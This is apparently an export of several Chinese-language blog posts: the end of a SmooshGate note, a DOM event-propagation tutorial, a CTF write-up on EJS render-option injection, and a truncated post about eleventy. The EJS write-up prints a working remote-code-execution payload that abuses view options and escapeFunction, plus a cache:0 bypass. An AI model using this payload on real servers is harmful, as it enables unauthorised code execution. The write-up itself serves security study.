滿有趣的，會去測試一大堆元素的 interface 是不是正確的，在 interfaces.js 裡面可以看到它測試的列表： var elements = [ [\"a\", \"Anchor\"], [\"abbr\", \"\"], [\"acronym\", \"\"], [\"address\", \"\"], [\"applet\", \"Unknown\"], [\"area\", \"Area\"], [\"article\", \"\"], [\"aside\", \"\"], [\"audio\", \"Audio\"], [\"b\", \"\"], [\"base\", \"Base\"], [\"basefont\", \"\"], [\"bdi\", \"\"], [\"bdo\", \"\"], [\"bgsound\", \"Unknown\"], [\"big\", \"\"], [\"blink\", \"Unknown\"], [\"blockquote\", \"Quote\"], [\"body\", \"Body\"], [\"br\", \"BR\"], [\"button\", \"Button\"], [\"canvas\", \"Canvas\"], [\"caption\", \"TableCaption\"], [\"center\", \"\"], [\"cite\", \"\"], [\"code\", \"\"], [\"col\", \"TableCol\"], [\"colgroup\", \"TableCol\"], [\"command\", \"Unknown\"], [\"data\", \"Data\"], [\"datalist\", \"DataList\"], [\"dd\", \"\"], [\"del\", \"Mod\"], [\"details\", \"Details\"], [\"dfn\", \"\"], [\"dialog\", \"Dialog\"], [\"dir\", \"Directory\"], [\"directory\", \"Unknown\"], [\"div\", \"Div\"], [\"dl\", \"DList\"], [\"dt\", \"\"], [\"em\", \"\"], [\"embed\", \"Embed\"], [\"fieldset\", \"FieldSet\"], [\"figcaption\", \"\"], [\"figure\", \"\"], [\"font\", \"Font\"], [\"foo-BAR\", \"Unknown\"], // not a valid custom element name [\"foo-bar\", \"\"], // valid custom element name [\"foo\", \"Unknown\"], [\"footer\", \"\"], [\"form\", \"Form\"], [\"frame\", \"Frame\"], [\"frameset\", \"FrameSet\"], [\"h1\", \"Heading\"], [\"h2\", \"Heading\"], [\"h3\", \"Heading\"], [\"h4\", \"Heading\"], [\"h5\", \"Heading\"], [\"h6\", \"Heading\"], [\"head\", \"Head\"], [\"header\", \"\"], [\"hgroup\", \"\"], [\"hr\", \"HR\"], [\"html\", \"Html\"], [\"i\", \"\"], [\"iframe\", \"IFrame\"], [\"image\", \"Unknown\"], [\"img\", \"Image\"], [\"input\", \"Input\"], [\"ins\", \"Mod\"], [\"isindex\", \"Unknown\"], [\"kbd\", \"\"], [\"keygen\", \"Unknown\"], [\"label\", \"Label\"], [\"legend\", \"Legend\"], [\"li\", \"LI\"], [\"link\", \"Link\"], [\"listing\", \"Pre\"], [\"main\", \"\"], [\"map\", \"Map\"], [\"mark\", \"\"], [\"marquee\", \"Marquee\"], [\"menu\", \"Menu\"], [\"meta\", \"Meta\"], [\"meter\", \"Meter\"], [\"mod\", \"Unknown\"], [\"multicol\", \"Unknown\"], [\"nav\", \"\"], [\"nextid\", \"Unknown\"], [\"nobr\", \"\"], [\"noembed\", \"\"], [\"noframes\", \"\"], [\"noscript\", \"\"], [\"object\", \"Object\"], [\"ol\", \"OList\"], [\"optgroup\", \"OptGroup\"], [\"option\", \"Option\"], [\"output\", \"Output\"], [\"p\", \"Paragraph\"], [\"param\", \"Param\"], [\"picture\", \"Picture\"], [\"plaintext\", \"\"], [\"pre\", \"Pre\"], [\"progress\", \"Progress\"], [\"q\", \"Quote\"], [\"quasit\", \"Unknown\"], [\"rb\", \"\"], [\"rp\", \"\"], [\"rt\", \"\"], [\"rtc\", \"\"], [\"ruby\", \"\"], [\"s\", \"\"], [\"samp\", \"\"], [\"script\", \"Script\"], [\"section\", \"\"], [\"select\", \"Select\"], [\"slot\", \"Slot\"], [\"small\", \"\"], [\"source\", \"Source\"], [\"spacer\", \"Unknown\"], [\"span\", \"Span\"], [\"strike\", \"\"], [\"strong\", \"\"], [\"style\", \"Style\"], [\"sub\", \"\"], [\"summary\", \"\"], [\"sup\", \"\"], [\"table\", \"Table\"], [\"tbody\", \"TableSection\"], [\"td\", \"TableCell\"], [\"textarea\", \"TextArea\"], [\"tfoot\", \"TableSection\"], [\"th\", \"TableCell\"], [\"thead\", \"TableSection\"], [\"time\", \"Time\"], [\"title\", \"Title\"], [\"tr\", \"TableRow\"], [\"track\", \"Track\"], [\"tt\", \"\"], [\"u\", \"\"], [\"ul\", \"UList\"], [\"var\", \"\"], [\"video\", \"Video\"], [\"wbr\", \"\"], [\"xmp\", \"Pre\"], [\"\\u00E5-bar\", \"Unknown\"], // not a valid custom element name ]; 像是 applet、bgsound、blink 等等這些元素，就應該回傳 HTMLUnknownElement。 總結這一趟旅程一樣收穫滿滿，從一個議題持續向外延伸，就能挖到更多有趣的東西。 例如說我們從 SmooshGate 事件，學到了 TC39 的運作流程、flatten 壞掉的原因以及 V8 當初實作 flatten 的 commit 還有學到怎麼寫測試。也學習到了 don’t break the web 的原則，再從這個原則去看了 HTML 的規格，看到了那些被淘汰的 tag，最後去看了在 chromium 裡面怎麼做處理。 制定規格的人要注重的層面以及要考慮的問題真的很多，因為一旦做下去，就很難再回頭了；規格書也要寫得清楚又明白，而且不能有錯誤。 真心佩服那些制定標準的人。 參考資料： You Don’t Know JS Yet: Get Started - 2nd Edition Chapter 1: What Is JavaScript? SmooshGate #SmooshGate FAQ Non-conforming features 3.2.2 Elements in the DOM","link":"/2019/11/26/dont-break-web-smooshgate-and-keygen/"},{"title":"DOM 的事件傳遞機制：捕獲與冒泡","text":"前言2021-05-25 補充：文中所提到的在 target phase 會依照加上 event listener 的順序觸發，在新版的 Chrome 似乎更改了這個行為，請參考：Chrome 89 更新事件触发顺序，导致99%的文章都错了（包括MDN） （補充：感謝 othree 前輩的指點，指出這其實是在講 DOM 裡面事件傳遞的順序，因此把標題以及內文修正，原標題為：JavaScript 的事件傳遞機制：捕獲與冒泡） 今天為大家帶來的內容是 DOM 裡面的事件傳遞機制，而與這些事件相關的程式碼，相信大家應該不太陌生，就是addEventListener, preventDefault跟stopPropagation。 簡單來說，就是事件在 DOM 裡面傳遞的順序，以及你可以對這些事件做什麼。 為什麼會有「傳遞順序」這一詞呢？假設你有一個ul元素，底下有很多li，代表不同的 item。當你點擊任何一個li的時候，其實你也點擊了ul，因為ul把所有的li都包住了。 假如我在兩個元素上面都加了eventListener，哪一個會先執行？這時候呢，知道事件的執行順序就很重要。 另外，由於某些瀏覽器（沒錯，我就是在說 IE）的機制比較不太一樣，因此那些東西我完全不會提到，有興趣的可以研究文末附的參考資料。 簡單範例為了之後方便說明，我們先寫一個非常簡單的範例出來： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;ul id=\"list\"> &lt;li id=\"list_item\"> &lt;a id=\"list_item_link\" target=\"_blank\" href=\"http://google.com\"> google.com &lt;/a> &lt;/li> &lt;/ul> &lt;/body> &lt;/html> 在這個範例裡面，就是最外層一個ul，再來li，最後則是一個超連結。為了方便辨識，id 的取名也跟階層架構有關係。 DOM 畫成圖大概是長這樣： 有了這一個簡單的 HTML 結構之後，就可以很清楚的說明 DOM 的事件傳遞機制了。 事件的三個 Phase要幫一個 DOM 加上 click 的事件，你會這樣寫： const $list = document.getElementById('list'); $list.addEventListener('click', (e) => &#123; console.log('click!'); &#125;) 而這邊的e裡面就蘊含了許多這次事件的相關參數，其中有一個叫做eventPhase ，是一個數字，表示這個事件在哪一個 Phase 觸發。 const $list = document.getElementById('list'); $list.addEventListener('click', (e) => &#123; console.log(e.eventPhase); &#125;) eventPhase的定義可以在 DOM specification 裡面找到： &#x2F;&#x2F; PhaseType const unsigned short CAPTURING_PHASE &#x3D; 1; const unsigned short AT_TARGET &#x3D; 2; const unsigned short BUBBLING_PHASE &#x3D; 3; 這三個階段，就是我們今天的重點。 DOM 的事件在傳播時，會先從根節點開始往下傳遞到target，這邊你如果加上事件的話，就會處於CAPTURING_PHASE，捕獲階段。 target就是你所點擊的那個目標，這時候在target身上所加的eventListenr會是AT_TARGET這一個 Phase。 最後，事件再往上從子節點一路逆向傳回去根節點，這時候就叫做BUBBLING_PHASE ，也是大家比較熟知的冒泡階段。 這邊用文字你可能會覺得霧煞煞，我直接引用一張 w3c 講 event flow 的圖，相信大家就清楚了。 你在點擊那一個td的時候，這一個點擊的事件會先從window開始往下傳，一直傳到td為止，到這邊就叫做CAPTURING_PHASE，捕獲階段。 接著事件傳遞到td本身，這時候叫做AT_TARGET。 最後事件會從td一路傳回去window，這時候叫做BUBBLING_PHASE，冒泡階段。 所以，在看一些講事件機制的文章的時候，都會看到一個口訣： 先捕獲，再冒泡 就是這樣來的。 可是，我要怎麼決定我要在捕獲階段還是冒泡階段去監聽這個事件呢？ 其實，一樣是用大家所熟悉的addEventListener，只是這函數其實有第三個參數，true代表把這個 listener 添加到捕獲階段，false或是沒有傳就代表把這個 listener 添加到冒泡階段。 實際演練大概知道事件的傳遞機制之後，我們拿上面寫好的那一個簡單範例來示範一下，一樣先附上事件傳遞的流程圖（假設我們點擊的對象是#list_item_link） 接著，來試試看幫每一個元素的每一個階段都添加事件，看一看結果跟想像中的是否一樣： const get = (id) => document.getElementById(id); const $list = get('list'); const $list_item = get('list_item'); const $list_item_link = get('list_item_link'); // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); &#125;, true) // list 的冒泡 $list.addEventListener('click', (e) => &#123; console.log('list bubbling', e.eventPhase); &#125;, false) // list_item 的捕獲 $list_item.addEventListener('click', (e) => &#123; console.log('list_item capturing', e.eventPhase); &#125;, true) // list_item 的冒泡 $list_item.addEventListener('click', (e) => &#123; console.log('list_item bubbling', e.eventPhase); &#125;, false) // list_item_link 的捕獲 $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link capturing', e.eventPhase); &#125;, true) // list_item_link 的冒泡 $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link bubbling', e.eventPhase); &#125;, false) 點一下超連結，console 輸出以下結果： list capturing 1 list_item capturing 1 list_item_link capturing 2 list_item_link bubbling 2 list_item bubbling 3 list bubbling 3 1 是CAPTURING_PHASE，2 是AT_TARGET，3 是BUBBLING_PHASE。 從這邊就可以很明顯看出，事件的確是從最上層一直傳遞到 target，而在這傳遞的過程裡，我們用addEventListenr的第三個參數把 listener 添加在CAPTURING_PHASE。 然後事件傳遞到我們點擊的超連結（a#list_item_link）本身，在這邊無論你使用addEventListener的第三個參數是true還是false，這邊的e.eventPhase都會變成AT_TARGET。 最後，再從 target 不斷冒泡傳回去，先傳到上一層的#list_item，再傳到上上層的#list。 先捕獲，再冒泡的小陷阱既然是先捕獲，再冒泡，意思就是無論那些addEventListener的順序怎麼變，輸出的東西應該還是會一樣才對。我們把捕獲跟冒泡的順序對調，看一下輸出結果是否一樣。 const get = (id) => document.getElementById(id); const $list = get('list'); const $list_item = get('list_item'); const $list_item_link = get('list_item_link'); // list 的冒泡 $list.addEventListener('click', (e) => &#123; console.log('list bubbling', e.eventPhase); &#125;, false) // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); &#125;, true) // list_item 的冒泡 $list_item.addEventListener('click', (e) => &#123; console.log('list_item bubbling', e.eventPhase); &#125;, false) // list_item 的捕獲 $list_item.addEventListener('click', (e) => &#123; console.log('list_item capturing', e.eventPhase); &#125;, true) // list_item_link 的冒泡 $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link bubbling', e.eventPhase); &#125;, false) // list_item_link 的捕獲 $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link capturing', e.eventPhase); &#125;, true) 一樣點擊超連結，輸出的結果是： list capturing 1 list_item capturing 1 list_item_link bubbling 2 list_item_link capturing 2 list_item bubbling 3 list bubbling 3 可以發現一件神奇的事，那就是list_item_link居然是先執行了添加在冒泡階段的 listener，才執行捕獲階段的 listener。 這是為什麼呢？ 其實剛剛上面有提到，當事件傳遞到點擊的真正對象，也就是 e.target 的時候，無論你使用addEventListener的第三個參數是true還是false，這邊的e.eventPhase都會變成AT_TARGET。 既然這邊已經變成AT_TARGET，自然就沒有什麼捕獲跟冒泡之分，所以執行順序就會根據你addEventListener的順序而定，先添加的先執行，後添加的後執行。 所以，這就是為什麼我們上面把捕獲跟冒泡的順序換了以後，會先出現list_item_link bubbling的原因。 關於這些事件的傳遞順序，只要記住兩個原則就好： 先捕獲，再冒泡 當事件傳到 target 本身，沒有分捕獲跟冒泡 jsbin 範例程式碼 取消事件傳遞接著要講的是，這一串事件鏈這麼長，一定有方法可以中斷這一條鏈，讓事件的傳遞不再繼續。而這個方法相信大家應該都不陌生，就是：e.stopPropagation。 你加在哪邊，事件的傳遞就斷在哪裡，不會繼續往下傳遞。 例如說以上面那個例子來講，假如我加在#list的捕獲階段： // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); e.stopPropagation(); &#125;, true) 這樣子，console 就只會輸出： list capturing 1 因為事件的傳遞被停止，所以剩下的 listener 都不會再收到任何事件。 不過，在這邊依然有一個地方要特別注意。 這邊指的「事件傳遞被停止」，意思是說不會再把事件傳遞給「下一個節點」，但若是你在同一個節點上有不只一個 listener，還是會被執行到。 例如說： // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing'); e.stopPropagation(); &#125;, true) // list 的捕獲 2 $list.addEventListener('click', (e) => &#123; console.log('list capturing2'); &#125;, true) 輸出結果是： list capturing list capturing2 儘管已經用e.stopPropagation，但對於同一個層級，剩下的 listener 還是會被執行到。 若是你想要讓其他同一層級的 listener 也不要被執行，可以改用e.stopImmediatePropagation(); 例如說： // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing'); e.stopImmediatePropagation(); &#125;, true) // list 的捕獲 2 $list.addEventListener('click', (e) => &#123; console.log('list capturing2'); &#125;, true) 輸出結果是： list capturing 取消預設行為常常有人搞不清楚e.stopPropagation跟e.preventDefault的差別，前者我們剛剛已經說明了，就是取消事件繼續往下傳遞，而後者則是取消瀏覽器的預設行為。 最常見的做法就是阻止超連結，例如說： // list_item_link 的冒泡 $list_item_link.addEventListener('click', (e) => &#123; e.preventDefault(); &#125;, false) 這樣子，當點擊超連結的時候，就不會執行原本預設的行為（新開分頁或是跳轉），而是沒有任何事情發生，這就是preventDefault的作用。 所以呢，preventDefault跟 JavaScript 的事件傳遞「一點關係都沒有」，你加上這一行之後，事件還是會繼續往下傳遞。 有一個特別值得注意的地方是 W3C 的文件裡面有寫到： Once preventDefault has been called it will remain in effect throughout the remainder of the event’s propagation. 意思就是說一旦 call 了preventDefault ，在之後傳遞下去的事件裡面也會有效果。 我們來看一個範例： // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); e.preventDefault(); &#125;, true) 我們在#list的捕獲事件裡面就先寫了e.preventDefault()，而根據文件上面所說的，這個效果會在之後傳遞的事件裡面一直延續。 因此，等之後事件傳遞到#list_item_link的時候，你會發現點超連結一樣沒反應。 實際應用知道了事件的傳遞機制、取消傳遞事件跟取消預設行為之後，在實際開發上有什麼用處呢？ 最常見的用法其實就是事件代理（Delegation），例如說你今天有一個 ul，底下 1000 個 li，如果你幫每一個 li 都加上一個 eventListener，你就新建了 1000 個 function。 但我們剛剛已經知道，任何點擊 li 的事件其實都會傳到 ul 身上，因此我們可以在 ul 身上掛一個 listener 就好。 &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;ul id=\"list\"> &lt;li data-index=\"1\">1&lt;/li> &lt;li data-index=\"2\">2&lt;/li> &lt;li data-index=\"3\">3&lt;/li> &lt;/ul> &lt;/body> &lt;/html> document.getElementById('list').addEventListener('click', (e) => &#123; console.log(e.target.getAttribute('data-index')); &#125;) 而這樣的好處是當你新增或是刪除一個 li 的時候，不用去處理跟那個元素相關的 listener，因為你的 listener 是放在 ul 身上。這樣透過父節點來處理子節點的事件，就叫做事件代理。 除此之外，我有想到幾個滿有趣的應用，大家可以參考看看。 例如說剛剛提到的e.preventDefault()，既然我們知道原理跟使用技巧，就可以這樣用： window.addEventListener('click', (e) => &#123; e.preventDefault(); e.stopPropagation(); &#125;, true); 只要這樣一段程式碼，就可以把頁面上所有的元素停用，點了都沒有反應，像是&lt;a&gt;點了不會跳出超連結，&lt;form&gt;按了submit也沒用，而且因為阻止事件冒泡，所以其他的onClick事件也都不會執行。 或是，也可以這樣用： window.addEventListener('click', (e) => &#123; console.log(e.target); &#125;, true) 利用事件傳遞機制的特性，在window上面使用捕獲，就能保證一定是第一個被執行的事件，你就可以在這個 function 裡面偵測頁面中每一個元素的點擊，可以傳回去做數據統計及分析。 結論DOM 的事件傳遞機制算是 JavaScript 眾多經典面試題裡面相對簡單很多的，只要能掌握事件傳遞的原則跟順序，其實就差不多了。 而e.preventDefault與e.stopPropagation的差別在知道事件傳遞順序之後也大概能理解，前者就只是取消預設行為，跟事件傳遞沒有任何關係，後者則是讓事件不再往下傳遞。 希望這篇能讓大家理解 DOM 的事件傳遞機制，如果有哪邊有講錯，也麻煩大家不吝指證，感謝。 參考資料（比較推薦後面那些原文資料）： JavaScript 详说事件机制之冒泡、捕获、传播、委托 Javascript 事件冒泡和捕获的一些探讨 浅谈 javascript 事件取消和阻止冒泡 What Is Event Bubbling in JavaScript? Event Propagation Explained What is event bubbling and capturing? Event order Document Object Model Events","link":"/2017/08/27/dom-event-capture-and-propagation/"},{"title":"CTF 中的 EJS 漏洞筆記","text":"原本是想用開發者的角度寫一篇，但最近沒什麼時間，先寫一篇用 CTF 角度來記錄這個問題，以後有時間再補上用開發者角度寫的。 簡單來說，這篇講的是使用以下 pattern 會造成的問題： const express = require('express') const app = express() const port = 3000 app.set('view engine', 'ejs'); app.get('/', (req,res) => &#123; res.render('index', req.query); &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;`) &#125;) 出現過的 CTF 考題其實有關於 EJS，曾經考過的類型有兩種，第一種是像上面那樣你可以控制 render 中的第二個參數，第二種是你不能控制，但是有 prototype pollution 的漏洞。 第一種的話是 EJS 對於參數的處理其實我自己覺得有點問題，你可能以為只是傳入 data，但其實它 option 跟 data 是混在一起傳的，所以可以去更改 options，控制一些執行流程達成 RCE。 第二種的話主要是經由 prototype pollution 去污染 outputFunctionName，然後靠著 EJS 底層會用 outputFunctionName 去拼接 JS 程式碼達成 RCE。 不過後來 EJS 有新增對於 outputFunctionName 的檢查就是了，確保傳入的東西真的是個合法的變數名稱。 這篇文章談的主要是第一種的狀況。 底下是以前出現過的相關考題，早期比較多都是 prototype pollution 為主，最近出現的則是直接讓你傳入 object 居多。 Codegate CTF 2023 Preliminary - Music Player SEETF 2023 - Express JavaScript Security justCTF 2023 - Perfect Product hxp CTF 2022 - valentine Pwn2Win CTF 2021 - Illusion AIS3 EOF CTF 2019 Quals - echo XNUCA 2019 Qualifier - hardjs 問題的根源呼叫 res.render() 以後會先到 express&#x2F;lib&#x2F;response.js： res.render = function render(view, options, callback) &#123; var app = this.req.app; var done = callback; var opts = options || &#123;&#125;; var req = this.req; var self = this; // support callback function as second arg if (typeof options === 'function') &#123; done = options; opts = &#123;&#125;; &#125; // merge res.locals opts._locals = self.locals; // default callback to respond done = done || function (err, str) &#123; if (err) return req.next(err); self.send(str); &#125;; // render app.render(view, opts, done); &#125;; 接著看到 app.render，在 express&#x2F;lib&#x2F;application.js： app.render = function render(name, options, callback) &#123; var cache = this.cache; var done = callback; var engines = this.engines; var opts = options; var renderOptions = &#123;&#125;; var view; // support callback function as second arg if (typeof options === 'function') &#123; done = options; opts = &#123;&#125;; &#125; // merge app.locals merge(renderOptions, this.locals); // merge options._locals if (opts._locals) &#123; merge(renderOptions, opts._locals); &#125; // merge options merge(renderOptions, opts); // set .cache unless explicitly provided if (renderOptions.cache == null) &#123; renderOptions.cache = this.enabled('view cache'); &#125; // primed cache if (renderOptions.cache) &#123; view = cache[name]; &#125; // view if (!view) &#123; var View = this.get('view'); view = new View(name, &#123; defaultEngine: this.get('view engine'), root: this.get('views'), engines: engines &#125;); if (!view.path) &#123; var dirs = Array.isArray(view.root) &amp;&amp; view.root.length > 1 ? 'directories \"' + view.root.slice(0, -1).join('\", \"') + '\" or \"' + view.root[view.root.length - 1] + '\"' : 'directory \"' + view.root + '\"' var err = new Error('Failed to lookup view \"' + name + '\" in views ' + dirs); err.view = view; return done(err); &#125; // prime the cache if (renderOptions.cache) &#123; cache[name] = view; &#125; &#125; // render tryRender(view, renderOptions, done); &#125;; 這邊最後會呼叫 tryRender，程式碼在express&#x2F;lib&#x2F;application.js： function tryRender(view, options, callback) &#123; try &#123; view.render(options, callback); &#125; catch (err) &#123; callback(err); &#125; &#125; 這個 view.render 會去呼叫 view engine 裡面的 __express 方法，而這個方法在 EJS 裡面就是 renderFile： ejs&#x2F;lib&#x2F;ejs.js： /** * Express.js support. * * This is an alias for &#123;@link module:ejs.renderFile&#125;, in order to support * Express.js out-of-the-box. * * @func */ exports.__express = exports.renderFile; renderFile： exports.renderFile = function () &#123; var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = &#123;filename: filename&#125;; var data; var viewOpts; // Do we have a callback? if (typeof arguments[arguments.length - 1] == 'function') &#123; cb = args.pop(); &#125; // Do we have data/opts? if (args.length) &#123; // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) &#123; // Use shallowCopy so we don't pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); &#125; // Special casing for Express (settings + opts-in-data) else &#123; // Express 3 and 4 if (data.settings) &#123; // Pull a few things from known locations if (data.settings.views) &#123; opts.views = data.settings.views; &#125; if (data.settings['view cache']) &#123; opts.cache = true; &#125; // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings['view options']; if (viewOpts) &#123; utils.shallowCopy(opts, viewOpts); &#125; &#125; // Express 2 and lower, values set in app.locals, or people who just // want to pass options in their data. NOTE: These values will override // anything previously set in settings or settings['view options'] utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); &#125; opts.filename = filename; &#125; else &#123; data = utils.createNullProtoObjWherePossible(); &#125; return tryHandleCache(opts, data, cb); &#125;; 這邊的重點是中間那段： if (data.settings) &#123; // Pull a few things from known locations if (data.settings.views) &#123; opts.views = data.settings.views; &#125; if (data.settings['view cache']) &#123; opts.cache = true; &#125; // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings['view options']; if (viewOpts) &#123; utils.shallowCopy(opts, viewOpts); &#125; &#125; 簡單來說，設置 data.settings[&#39;view options&#39;] 就可以蓋掉 opts。 再來一路往下追會到 handleCache： function handleCache(options, template) &#123; var func; var filename = options.filename; var hasTemplate = arguments.length > 1; if (options.cache) &#123; if (!filename) &#123; throw new Error('cache option requires a filename'); &#125; func = exports.cache.get(filename); if (func) &#123; return func; &#125; if (!hasTemplate) &#123; template = fileLoader(filename).toString().replace(_BOM, ''); &#125; &#125; else if (!hasTemplate) &#123; // istanbul ignore if: should not happen at all if (!filename) &#123; throw new Error('Internal EJS error: no file name or template ' + 'provided'); &#125; template = fileLoader(filename).toString().replace(_BOM, ''); &#125; func = exports.compile(template, options); if (options.cache) &#123; exports.cache.set(filename, func); &#125; return func; &#125; 如果 options.cache 有設置，那就直接用 cache 裡已經 compile 過的東西，否則就重新 compile 一次。 而最後重點中的重點就是 compile，裡面有一段如下： if (opts.client) &#123; src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src; if (opts.compileDebug) &#123; src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src; &#125; &#125; 會拿 escapeFn 去拼接程式碼。 於是我們只要傳入： const payload = &#123; settings: &#123; 'view options': &#123; client: true, escapeFunction: '(() => &#123;&#125;);return process.mainModule.require(\"child_process\").execSync(\"id\").toString()' &#125; &#125; &#125; 就可以執行任意程式碼，達成 RCE。 Cache 的問題雖然前面講的很順，但是有一個 cache 的問題。 在 production 模式底下 view cache 會自動啟用： if (env === 'production') &#123; this.enable('view cache'); &#125; 而這個參數在 render 的時候會自動被帶到 options 裡面： // set .cache unless explicitly provided if (renderOptions.cache == null) &#123; renderOptions.cache = this.enabled('view cache'); &#125; 雖然說我們可以透過 view options 覆蓋原本的 options，但如果原本 options 內就有傳入 cache 的話，又會被覆蓋回去： utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); 如果無法覆蓋 cache，那就不能使用上面的方法了，因為 template 不會重新被 compile。 不過沒關係，幸好這是 JavaScript，注意這行程式碼： if (renderOptions.cache == null) &#123; renderOptions.cache = this.enabled('view cache'); &#125; 如果 renderOptions.cache 是 null 的話才會去設置，而 0 == null 是 false，所以我們可以傳入 cache: 0，就不會進去這一段。 而 0 是 falsy，所以可以繞過 cache 的檢查，讓 if (options.cache) 是 false。 EJS 作者的看法其實 EJS 從以前就有不少相關的 issue 了，清單如下： Unrestricted render option may lead to a RCE vulnerability #451 Mitigate prototype pollution effects #601 [Vulnerability] Server side template injection leads to RCE #663 EJS, Server side template injection ejs@3.1.9 Latest #720 EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) #735 而作者的立場從以前到現在都一樣： The problem here is that EJS is simply a way of executing JS to render a template. If you allow passing of arbitrary&#x2F;unsanitized options and data to the render function, you will encounter all security problems that would occur as a result of arbitrary code execution. Henny Youngman used to tell a joke: “The patient says, ‘Doctor, it hurts when I do this.’ So the doctor says, ‘Then don’t do that!’” I’m open to PRs that improve security, but this looks to me to be far beyond the purview of the library. These responsibilities live squarely in userland. 主要就是說如果開發者自己要這樣用 library 的話他也沒辦法，這不是 EJS 應該負責的，不該讓 end user 可以傳入整個 object。 而 EJS 的開發者最近也因為收到很多這類型的 issue report，直接在 README 以及官網上面都加上了告示： Security professionals, before reporting any security issues, please reference the SECURITY.md in this project, in particular, the following: “EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.” 所以這篇文章講的這招無論是現在還是未來都可以用，只要看到有人在 render 時的 object 可控，就意味著可以打到 RCE。 之後想再寫一篇從開發者角度來看這件事情，雖然說 EJS 作者講的有點道理，但至少 EJS 作為一個 library，應該在文件上特別提醒開發者不該這樣使用，雖然說現在已經有提示，但更針對的是叫 security researcher 不要回報，而不是叫開發者不要這樣用。 或者，會不會這個其實是一個 bad coding practice，一開始就不該有這樣的 pattern 可以讓別人利用？ 這塊我也還沒想清楚，之後想清楚再來寫吧。","link":"/2023/06/22/ejs-render-vulnerability-ctf/"},{"title":"除了 hexo，也可以考慮用 eleventy 來寫技術部落格","text":"前言講到寫技術部落格的話，現在最多人的首選應該都還是 hexo + GitHub Pages 這個組合，事實上，你目前看到的這個部落格也是用這個技術棧架起來的。 而最近我架了另外兩個技術部落格，卻不是使用 hexo，而是使用另外一套叫做 eleventy 的 static site generator，使用的滿意度極高，因此特地寫了這篇文章跟大家推薦這套。 如果你想先看是哪兩個部落格，在這邊： ErrorBaker 技術共筆部落格 Cymetrics Tech Blog 為什麼是 eleventy？我一開始知道這套，是從這篇得知的：為什麼我離開 Medium 用 eleventy 做一個 blog，從文中可以看出 eleventy 的優勢之一就是簡單輕便，而這是我覺得部落格滿重要的一部分。 像是 hexo 這種倒是還好，大部分的 theme 效能都不會到太差，頂多是肥了一點，以我目前的 huli blog 來說，首頁的 lighthouse 跑分在效能上是 81 分，First Contentful Paint 是 3.4 秒，沒有到很差，但有進步空間，而且我這個部落格看起來明明就很簡潔卻花了這麼多時間，代表有很多地方可以改進。 但我看過一些自己建的部落格效能有夠差，跑個好幾秒才有內容出來，這種就完全無法接受。 在上面的文中有介紹了一套 Google AMP tech lead 開發的 eleventy-high-performance-blog，既然標題都已經這樣取了，就代表是以效能為導向。 前陣子我剛好要幫以前的學生們架一個技術共筆部落格，就想到了這套解決方案，並且實際試了一下，結果一鳴驚人，用了之後馬上愛上這一套，整體的滿意度我給五星好評。 如果你對我講到的這個部落格有興趣，連結在這邊：ErrorBaker 技術共筆部落格 eleventy-high-performance-blog 這個模板的好處在於效能真的很快，有幫你處理過很多東西，包括： 圖片的最佳化，自動壓縮、轉換格式以及用 &lt;pictrue&gt; 載入，還有原生 lazyload 幾乎沒有太多 CSS 跟 JS，所以檔案大小很小 基本的 SEO 都有做 a11y 有考量進去 版面簡潔，檔案少，要修改很容易 除了模板的好處以外，eleventy（以下簡稱 11ty）這一套 SSG 也有些好處，包括： 語法簡單容易上手 客製化容易 文件滿詳細的 值得一提的是這些部落格其實都是給一個人用的，而我要架的部落格預設就是多人共筆，所以會有多個作者，因此本來就需要客製化修改一些東西。而這些修改我大概花了半天到一天左右就搞定了，就把單人部落格變成多人共筆部落格。 eleventy-high-performance-blog 這個模板 + 11ty 這兩套都很簡潔，所以客製化非常容易，檔案少的好處就是你不用花太多時間去找要改哪裡。 身為前端工程師，我覺得有個可以輕鬆客製化的部落格是很不錯的一件事，因為你想嘗試什麼新技術或是做效能最佳化都會容易許多，很快就可以找到要怎麼改。 原本架的那個共筆部落格搞一個段落之後，剛好公司的部落格想要搬家，因此我就拿之前弄好的來改，版面調整一下就有了一個新的部落格：Cymetrics Tech Blog 總結一下，基本上我覺得 11ty 跟 eleventy-high-performance-blog 的優點是： 版面簡潔，適合不喜歡太多東西的人 修改容易，比較方便做客製化 部落格效能不錯，載入快速 一些缺點與我碰過的問題除了優點以外也來講一些缺點，平衡一下。 第一個缺點是 CSS 的部分不太好改，原本的 CSS 有些一定會被覆蓋掉的規則，但不知道為什麼沒有刪掉，而整體 CSS 看起來也寫得有點亂。 第二個缺點是圖片優化的部分因為是在 build time 直接去轉圖片，例如說把 png 轉成 webp 跟 avif，這部分只有 local cache，所以如果在 CI 上跑的話會很慢，之前有跑過 7 分鐘的 build。 解法有兩個，一個是把 cache image 一起 commit 進去，另一個是把 avif 轉換拿掉，因為這個花最多時間。 第三個是如果要串 utterances 這個評論系統的話有個小 bug，這一套登入之後會用網址列帶的 token 去做驗證，結果這模板有個功能是把 query string 弄掉，就得不到 token 就沒辦法登入。 暫時的 